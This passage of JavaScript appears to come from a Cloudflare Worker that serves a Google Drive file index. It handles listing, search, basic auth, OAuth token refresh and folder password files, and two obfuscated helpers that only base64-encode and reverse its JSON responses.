    var gdijsorg_0x5556bb = gdijsorg_0x56b1;
    (function(_0x3f3911, _0x38bce9) {
        var _0x32440e = gdijsorg_0x56b1;
        while (!![]) {
            try {
                var _0x2cab6f = -parseInt(_0x32440e(0xb3)) + -parseInt(_0x32440e(0xb7)) * -parseInt(_0x32440e(0xb6)) + -parseInt(_0x32440e(0xaf)) * -parseInt(_0x32440e(0xad)) + -parseInt(_0x32440e(0xb1)) + parseInt(_0x32440e(0xae)) + parseInt(_0x32440e(0xac)) + parseInt(_0x32440e(0xb0)) * -parseInt(_0x32440e(0xb5));
                if (_0x2cab6f === _0x38bce9) break;
                else _0x3f3911['push'](_0x3f3911['shift']());
            } catch (_0x34d506) {
                _0x3f3911['push'](_0x3f3911['shift']());
            }
        }
    }(gdijsorg_0x40df, 0xe5038));

    function gdijsorg_0x56b1(_0x1ccc20, _0x1596c4) {
        _0x1ccc20 = _0x1ccc20 - 0xac;
        var _0x40df0f = gdijsorg_0x40df[_0x1ccc20];
        return _0x40df0f;
    }
    return btoa(encodeURIComponent(str)[gdijsorg_0x5556bb(0xb4)](/%([0-9A-F]{2})/g, function toSolidBytes(_0xe8cc7f, _0x12410f) {
        var _0x1cce23 = gdijsorg_0x5556bb;
        return String[_0x1cce23(0xb2)]('0x' + _0x12410f);
    }));
}

async function apiRequest(request, gd) {
    let url = new URL(request.url);
    let path = url.pathname;
    path = path.replace(gd.url_path_prefix, '') || '/';

    let option = {
        status: 200,
        headers: {
            'Access-Control-Allow-Origin': '*'
        }
    }

    if (path.substr(-1) == '/') {
        let form = await request.formData();
        let deferred_list_result = gd.list(path, form.get('page_token'), Number(form.get('page_index')));

        if (authConfig['enable_password_file_verify']) {
            let password = await gd.password(path);
            // console.log("dir password", password);
            if (password && password.replace("\n", "") !== form.get('password')) {
                let html = `Y29kZWlzcHJvdGVjdGVk=0Xfi4icvJnclBCZy92dzNXYwJCI6ISZnF2czVWbiwSMwQDI6ISZk92YisHI6IicvJnclJyeYmFzZTY0aXNleGNsdWRlZA==`;
                return new Response(html, option);
            }
        }

        let list_result = await deferred_list_result;
        return new Response(rewrite(gdiencode(JSON.stringify(list_result), option)));
    } else {
        let file = await gd.file(path);
        let range = request.headers.get('Range');
        return new Response(rewrite(gdiencode(JSON.stringify(file))));
    }
}

// deal with search
async function handleSearch(request, gd) {
    const option = {
        status: 200,
        headers: {
            'Access-Control-Allow-Origin': '*'
        }
    };
    let form = await request.formData();
    let search_result = await
    gd.search(form.get('q') || '', form.get('page_token'), Number(form.get('page_index')));
    return new Response(rewrite(gdiencode(JSON.stringify(search_result), option)));
}

async function handleId2Path(request, gd) {
    const option = {
        status: 200,
        headers: {
            'Access-Control-Allow-Origin': '*'
        }
    };
    let form = await request.formData();
    let path = await gd.findPathById(form.get('id'));
    return new Response(path || '', option);
}

class googleDrive {
    constructor(authConfig, order) {
        this.order = order;
        this.root = authConfig.roots[order];
        this.root.protect_file_link = this.root.protect_file_link || false;
        this.url_path_prefix = `/${order}:`;
        this.authConfig = authConfig;
        this.paths = [];
        this.files = [];
        this.passwords = [];
        this.id_path_cache = {};
        this.id_path_cache[this.root['id']] = '/';
        this.paths["/"] = this.root['id'];
    }
    async init() {
        await this.accessToken();
        if (authConfig.user_drive_real_root_id) return;
        const root_obj = await (gds[0] || this).findItemById('root');
        if (root_obj && root_obj.id) {
            authConfig.user_drive_real_root_id = root_obj.id
        }
    }

    async initRootType() {
        const root_id = this.root['id'];
        const types = DriveFixedTerms.gd_root_type;
        if (root_id === 'root' || root_id === authConfig.user_drive_real_root_id) {
            this.root_type = types.user_drive;
        } else {
            const obj = await this.getShareDriveObjById(root_id);
            this.root_type = obj ? types.share_drive : types.sub_folder;
        }
    }

    basicAuthResponse(request) {
        const auth = this.root.auth || '',
            _401 = new Response(unauthorized, {
                headers: {
                    'WWW-Authenticate': `Basic realm="goindex:drive:${this.order}"`,
                    'content-type': 'text/html;charset=UTF-8'
                },
                status: 401
            });
        if (auth) {
            const _auth = request.headers.get('Authorization')
            if (_auth) {
                const [received_user, received_pass] = atob(_auth.split(' ').pop()).split(':');
                if (auth.hasOwnProperty(received_user)) {
                    if (auth[received_user] == received_pass) {
                        return null;
                    } else return _401;
                } else return _401;
            }
        } else return null;
        return _401;
    }

    async down(id, range = '', inline = false) {
        let url = `https://www.googleapis.com/drive/v3/files/${id}?alt=media`;
        let requestOption = await this.requestOption();
        requestOption.headers['Range'] = range;
        let res = await fetch(url, requestOption);
        const second_domain_for_dl = `${uiConfig.second_domain_for_dl}`
        if (second_domain_for_dl == 'true') {
            const res = await fetch(`${uiConfig.jsdelivr_cdn_src}@${uiConfig.version}/assets/disable_download.html`);
            return new Response(await res.text(), {
                headers: {
                    "content-type": "text/html;charset=UTF-8",
                },
            })
        }
        else if (res.ok) {
            const {
                headers
            } = res = new Response(res.body, res)
            this.authConfig.enable_cors_file_down && headers.append('Access-Control-Allow-Origin', '*');
            inline === true && headers.set('Content-Disposition', 'inline');
            return res;
        }
        else {
            const res = await fetch(`${uiConfig.jsdelivr_cdn_src}@${uiConfig.version}/assets/DownloadError.html`);
            return new Response(await res.text(), {
                headers: {
                    "content-type": "text/html;charset=UTF-8",
                },
            })
        }
    }

    async file(path) {
        if (typeof this.files[path] == 'undefined') {
            this.files[path] = await this._file(path);
        }
        return this.files[path];
    }

    async _file(path) {
        let arr = path.split('/');
        let name = arr.pop();
        name = decodeURIComponent(name).replace(/\'/g, "\\'");
        let dir = arr.join('/') + '/';
        // console.log(name, dir);
        let parent = await this.findPathId(dir);
        // console.log(parent);
        let url = 'https://www.googleapis.com/drive/v3/files';
        let params = {
            'includeItemsFromAllDrives': true,
            'supportsAllDrives': true
        };
        params.q = `'${parent}' in parents and name = '${name}' and trashed = false`;
        params.fields = "files(id, name, mimeType, size ,createdTime, modifiedTime, iconLink, thumbnailLink)";
        url += '?' + this.enQuery(params);
        let requestOption = await this.requestOption();
        let response = await fetch(url, requestOption);
        let obj = await response.json();
        // console.log(obj);
        return obj.files[0];
    }

    async list(path, page_token = null, page_index = 0) {
        if (this.path_children_cache == undefined) {
            // { <path> :[ {nextPageToken:'',data:{}}, {nextPageToken:'',data:{}} ...], ...}
            this.path_children_cache = {};
        }

        if (this.path_children_cache[path] &&
            this.path_children_cache[path][page_index] &&
            this.path_children_cache[path][page_index].data
        ) {
            let child_obj = this.path_children_cache[path][page_index];
            return {
                nextPageToken: child_obj.nextPageToken || null,
                curPageIndex: page_index,
                data: child_obj.data
            };
        }

        let id = await this.findPathId(path);
        let result = await this._ls(id, page_token, page_index);
        let data = result.data;
        if (result.nextPageToken && data.files) {
            if (!Array.isArray(this.path_children_cache[path])) {
                this.path_children_cache[path] = []
            }
            this.path_children_cache[path][Number(result.curPageIndex)] = {
                nextPageToken: result.nextPageToken,
                data: data
            };
        }

        return result
    }


    async _ls(parent, page_token = null, page_index = 0) {

        if (parent == undefined) {
            return null;
        }
        let obj;
        let params = {
            'includeItemsFromAllDrives': true,
            'supportsAllDrives': true
        };
        params.q = `'${parent}' in parents and trashed = false AND name !='.password'`;
        params.orderBy = 'folder,name,modifiedTime desc';
        params.fields = "nextPageToken, files(id, name, mimeType, size , modifiedTime)";
        params.pageSize = this.authConfig.files_list_page_size;

        if (page_token) {
            params.pageToken = page_token;
        }
        let url = 'https://www.googleapis.com/drive/v3/files';
        url += '?' + this.enQuery(params);
        let requestOption = await this.requestOption();
        let response = await fetch(url, requestOption);
        obj = await response.json();

        return {
            nextPageToken: obj.nextPageToken || null,
            curPageIndex: page_index,
            data: obj
        };
    }

    async password(path) {
        if (this.passwords[path] !== undefined) {
            return this.passwords[path];
        }

        let file = await this.file(path + '.password');
        if (file == undefined) {
            this.passwords[path] = null;
        } else {
            let url = `https://www.googleapis.com/drive/v3/files/${file.id}?alt=media`;
            let requestOption = await this.requestOption();
            let response = await this.fetch200(url, requestOption);
            this.passwords[path] = await response.text();
        }

        return this.passwords[path];
    }

    async getShareDriveObjById(any_id) {
        if (!any_id) return null;
        if ('string' !== typeof any_id) return null;

        let url = `https://www.googleapis.com/drive/v3/drives/${any_id}`;
        let requestOption = await this.requestOption();
        let res = await fetch(url, requestOption);
        let obj = await res.json();
        if (obj && obj.id) return obj;

        return null
    }

    async search(origin_keyword, page_token = null, page_index = 0) {
        const types = DriveFixedTerms.gd_root_type;
        const is_user_drive = this.root_type === types.user_drive;
        const is_share_drive = this.root_type === types.share_drive;
        const search_all_drives = `${uiConfig.search_all_drives}`
        const empty_result = {
            nextPageToken: null,
            curPageIndex: page_index,
            data: null
        };

        if (!is_user_drive && !is_share_drive) {
            return empty_result;
        }
        let keyword = SearchFunction.formatSearchKeyword(origin_keyword);
        if (!keyword) {
            return empty_result;
        }
        let words = keyword.split(/\s+/);
        let name_search_str = `name contains '${words.join("' AND name contains '")}'`;
        let params = {};
        if (is_user_drive) {
            if (search_all_drives == 'true') {
                params.corpora = 'allDrives';
                params.includeItemsFromAllDrives = true;
                params.supportsAllDrives = true;
            }
            else {
                params.corpora = 'user';
            }
        }
        if (is_share_drive) {
            if (search_all_drives == 'true') {
                params.corpora = 'allDrives';
            }
            else {
                params.corpora = 'drive';
                params.driveId = this.root.id;
            }
            params.includeItemsFromAllDrives = true;
            params.supportsAllDrives = true;
        }
        if (page_token) {
            params.pageToken = page_token;
        }
        params.q = `trashed = false AND name !='.password' AND (${name_search_str})`;
        params.fields = "nextPageToken, files(id, name, mimeType, size , modifiedTime)";
        params.pageSize = this.authConfig.search_result_list_page_size;
        params.orderBy = 'folder,name,modifiedTime desc';

        let url = 'https://www.googleapis.com/drive/v3/files';
        url += '?' + this.enQuery(params);
        let requestOption = await this.requestOption();
        let response = await fetch(url, requestOption);
        let res_obj = await response.json();

        return {
            nextPageToken: res_obj.nextPageToken || null,
            curPageIndex: page_index,
            data: res_obj
        };
    }

    async findParentFilesRecursion(child_id, contain_myself = true) {
        const gd = this;
        const gd_root_id = gd.root.id;
        const user_drive_real_root_id = authConfig.user_drive_real_root_id;
        const is_user_drive = gd.root_type === DriveFixedTerms.gd_root_type.user_drive;
        const target_top_id = is_user_drive ? user_drive_real_root_id : gd_root_id;
        const fields = DriveFixedTerms.default_file_fields;
        const parent_files = [];
        let meet_top = false;

        async function addItsFirstParent(file_obj) {
            if (!file_obj) return;
            if (!file_obj.parents) return;
            if (file_obj.parents.length < 1) return;
            let p_ids = file_obj.parents;
            if (p_ids && p_ids.length > 0) {
                const first_p_id = p_ids[0];
                if (first_p_id === target_top_id) {
                    meet_top = true;
                    return;
                }
                const p_file_obj = await gd.findItemById(first_p_id);
                if (p_file_obj && p_file_obj.id) {
                    parent_files.push(p_file_obj);
                    await addItsFirstParent(p_file_obj);
                }
            }
        }

        const child_obj = await gd.findItemById(child_id);
        if (contain_myself) {
            parent_files.push(child_obj);
        }
        await addItsFirstParent(child_obj);

        return meet_top ? parent_files : null
    }

    async findPathById(child_id) {
        if (this.id_path_cache[child_id]) {
            return this.id_path_cache[child_id];
        }

        const p_files = await this.findParentFilesRecursion(child_id);
        if (!p_files || p_files.length < 1) return '';

        let cache = [];
        // Cache the path and id of each level found
        p_files.forEach((value, idx) => {
            const is_folder = idx === 0 ? (p_files[idx].mimeType === DriveFixedTerms.folder_mime_type) : true;
            let path = '/' + p_files.slice(idx).map(it => it.name).reverse().join('/');
            if (is_folder) path += '/';
            cache.push({
                id: p_files[idx].id,
                path: path
            })
        });

        cache.forEach((obj) => {
            this.id_path_cache[obj.id] = obj.path;
            this.paths[obj.path] = obj.id
        });
        return cache[0].path;
    }

    async findItemById(id) {
        const is_user_drive = this.root_type === DriveFixedTerms.gd_root_type.user_drive;
        let url = `https://www.googleapis.com/drive/v3/files/${id}?fields=${DriveFixedTerms.default_file_fields}${is_user_drive ? '' : '&supportsAllDrives=true'}`;
        let requestOption = await this.requestOption();
        let res = await fetch(url, requestOption);
        return await res.json()
    }

    async findPathId(path) {
        let c_path = '/';
        let c_id = this.paths[c_path];

        let arr = path.trim('/').split('/');
        for (let name of arr) {
            c_path += name + '/';

            if (typeof this.paths[c_path] == 'undefined') {
                let id = await this._findDirId(c_id, name);
                this.paths[c_path] = id;
            }

            c_id = this.paths[c_path];
            if (c_id == undefined || c_id == null) {
                break;
            }
        }
        return this.paths[path];
    }

    async _findDirId(parent, name) {
        name = decodeURIComponent(name).replace(/\'/g, "\\'");
        if (parent == undefined) {
            return null;
        }

        let url = 'https://www.googleapis.com/drive/v3/files';
        let params = {
            'includeItemsFromAllDrives': true,
            'supportsAllDrives': true
        };
        params.q = `'${parent}' in parents and mimeType = 'application/vnd.google-apps.folder' and name = '${name}'  and trashed = false`;
        params.fields = "nextPageToken, files(id, name, mimeType)";
        url += '?' + this.enQuery(params);
        let requestOption = await this.requestOption();
        let response = await fetch(url, requestOption);
        let obj = await response.json();
        if (obj.files[0] == undefined) {
            return null;
        }
        return obj.files[0].id;
    }

    async accessToken() {
        console.log("accessToken");
        if (this.authConfig.expires == undefined || this.authConfig.expires < Date.now()) {
            const obj = await this.fetchAccessToken();
            if (obj.access_token != undefined) {
                this.authConfig.accessToken = obj.access_token;
                this.authConfig.expires = Date.now() + 3500 * 1000;
            }
        }
        return this.authConfig.accessToken;
    }

    async fetchAccessToken() {
        console.log("fetchAccessToken");
        const url = "https://www.googleapis.com/oauth2/v4/token";
        const headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        };
        var post_data;
        if (this.authConfig.service_account && typeof this.authConfig.service_account_json != "undefined") {
            const jwttoken = await JSONWebToken.generateGCPToken(this.authConfig.service_account_json);
            post_data = {
                grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                assertion: jwttoken,
            };
        } else {
            post_data = {
                client_id: this.authConfig.client_id,
                client_secret: this.authConfig.client_secret,
                refresh_token: this.authConfig.refresh_token,
                grant_type: "refresh_token",
            };
        }

        let requestOption = {
            'method': 'POST',
            'headers': headers,
            'body': this.enQuery(post_data)
        };

        const response = await fetch(url, requestOption);
        return await response.json();
    }

    async fetch200(url, requestOption) {
        let response;
        for (let i = 0; i < 3; i++) {
            response = await fetch(url, requestOption);
            console.log(response.status);
            if (response.status != 403) {
                break;
            }
            await this.sleep(800 * (i + 1));
        }
        return response;
    }

    async requestOption(headers = {}, method = 'GET') {
        const accessToken = await this.accessToken();
        headers['authorization'] = 'Bearer ' + accessToken;
        return {
            'method': method,
            'headers': headers
        };
    }

    enQuery(data) {
        const ret = [];
        for (let d in data) {
            ret.push(encodeURIComponent(d) + '=' + encodeURIComponent(data[d]));
        }
        return ret.join('&');
    }

    sleep(ms) {
        return new Promise(function(resolve, reject) {
            let i = 0;
            setTimeout(function() {
                console.log('sleep' + ms);
                i++;
                if (i >= 2) reject(new Error('i>=2'));
                else resolve(i);
            }, ms);
        })
    }
}

function rewrite(str) {
    var gdijsorg_0x4e46 = ['join', 'YmFzZTY0aXNleGNsdWRlZA==', '377943YNHRVT', '133527xcoEHq', '138191tQqett', '4JgyeDu', '299423DYjNuN', '622qCMSPH', 'reverse', 'split', '950361qrHraF', '1PjZtJR', '120619DeiSfH', '1153ekVsUn'];

    function gdijsorg_0x276f(_0x37674d, _0x2582b3) {
        _0x37674d = _0x37674d - 0x162;
        var _0x4e46db = gdijsorg_0x4e46[_0x37674d];
        return _0x4e46db;
    }
    var gdijsorg_0x3f8728 = gdijsorg_0x276f;
    (function(_0x4d8ef8, _0x302a25) {
        var _0x83f66b = gdijsorg_0x276f;
        while (!![]) {
            try {
                var _0x396eb3 = parseInt(_0x83f66b(0x16c)) * -parseInt(_0x83f66b(0x164)) + -parseInt(_0x83f66b(0x162)) * -parseInt(_0x83f66b(0x163)) + -parseInt(_0x83f66b(0x16b)) + -parseInt(_0x83f66b(0x167)) + -parseInt(_0x83f66b(0x169)) * -parseInt(_0x83f66b(0x16a)) + parseInt(_0x83f66b(0x168)) + parseInt(_0x83f66b(0x16f));
                if (_0x396eb3 === _0x302a25) break;
                else _0x4d8ef8['push'](_0x4d8ef8['shift']());
            } catch (_0x2dc29f) {
                _0x4d8ef8['push'](_0x4d8ef8['shift']());
            }
        }
    }(gdijsorg_0x4e46, 0x588f3));
    var sa = str[gdijsorg_0x3f8728(0x16e)](''),
        ra = sa[gdijsorg_0x3f8728(0x16d)](),
        ja = ra[gdijsorg_0x3f8728(0x165)](''),
        aj = 'Y29kZWlzcHJvdGVjdGVk' + ja + gdijsorg_0x3f8728(0x166);
    return aj;
}

String.prototype.trim = function(char) {
    if (char) {
        return this.replace(new RegExp('^\\' + char + '+|\\' + char + '+$', 'g'), '');
    }
    return this.replace(/^\s+|\s+$/g, '');
};
